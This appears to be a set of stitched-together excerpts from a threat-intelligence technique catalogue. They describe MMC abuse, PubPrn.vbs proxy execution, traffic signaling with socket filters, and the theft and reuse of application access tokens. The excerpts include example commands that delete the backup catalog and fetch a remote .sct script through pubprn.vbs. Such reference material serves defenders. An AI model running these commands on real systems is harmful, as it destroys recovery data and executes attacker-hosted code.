Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.<sup>[[win_mmc](https://app.tidalcyber.com/references/508373ef-2634-404f-99de-7a73cce68699)]</sup><sup>[[what_is_mmc](https://app.tidalcyber.com/references/57e130ab-f981-423e-bafe-51d0d0e1abdf)]</sup> MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.<sup>[[win_msc_files_overview](https://app.tidalcyber.com/references/81aa896a-3498-4c37-8882-2b77933b71a8)]</sup>\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.<sup>[[win_mmc](https://app.tidalcyber.com/references/508373ef-2634-404f-99de-7a73cce68699)]</sup> Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://app.tidalcyber.com/technique/d207c03b-fbe7-420e-a053-339f4650c043)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).<sup>[[win_wbadmin_delete_catalog](https://app.tidalcyber.com/references/6adfba35-3bf1-4915-813e-40c4a843ae34)]</sup><sup>[[phobos_virustotal](https://app.tidalcyber.com/references/929dbb22-34a5-4377-95dd-9e240ecb343a)]</sup>\n\nAdversaries may also abuse MMC to execute malicious .msc files.

An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site.

The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.<sup>[[haking9 libpcap network sniffing](https://app.tidalcyber.com/references/2803d0b8-78ee-4b19-aad3-daf84cd292b5)]</sup> Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells.

      "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://app.tidalcyber.com/technique/34a112db-c61d-4ea2-872f-de3fc1af87a3)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r <sup>[[Hartrell cd00r 2002](https://app.tidalcyber.com/references/739e6517-10f5-484d-8000-8818d63e7341)]</sup>, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://app.tidalcyber.com/technique/195aa08b-15fd-4019-b905-8f31bc5e2094) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.<sup>[[Cisco Synful Knock Evolution](https://app.tidalcyber.com/references/29301297-8343-4f75-8096-7fe229812f75)]</sup><sup>[[Mandiant - Synful Knock](https://app.tidalcyber.com/references/1f6eaa98-9184-4341-8634-5512a9c632dd)]</sup><sup>[[Cisco Blog Legacy Device Attacks](https://app.tidalcyber.com/references/f7ce5099-7e04-4c0b-8767-e0eec664b18e)]</sup>  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://app.tidalcyber.com/technique/630a17c1-0176-4764-8f5c-a83f4f3e980f) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems.

These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).<sup>[[Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019](https://app.tidalcyber.com/references/8ec52402-7e54-463d-8906-f373e5855018)]</sup> \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.<sup>[[okta](https://app.tidalcyber.com/references/61e2fb16-d04b-494c-8bea-fb34e81faa73)]</sup>\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.<sup>[[Microsoft Identity Platform Access 2019](https://app.tidalcyber.com/references/a39d976e-9b52-48f3-b5db-0ffd84ecd338)]</sup> With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.<sup>[[Staaldraad Phishing with OAuth 2017](https://app.tidalcyber.com/references/ae139c14-05ec-4c75-861b-15d86b4913fc)]</sup>\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.<sup>[[Google Cloud Service Account Credentials](https://app.tidalcyber.com/references/c4befa09-3c7f-49f3-bfcc-4fcbb7bace22)]</sup><sup>[[AWS Temporary Security Credentials](https://app.tidalcyber.com/references/c6f29134-5af2-42e1-af4f-fbb9eae03432)]</sup> The adversary can then use this token to request data or perform actions the original account could not.

For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.<sup>[[Crowdstrike AWS User Federation Persistence](https://app.tidalcyber.com/references/8c4f806c-b6f2-5bde-8525-05da6692e59c)]</sup> Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",
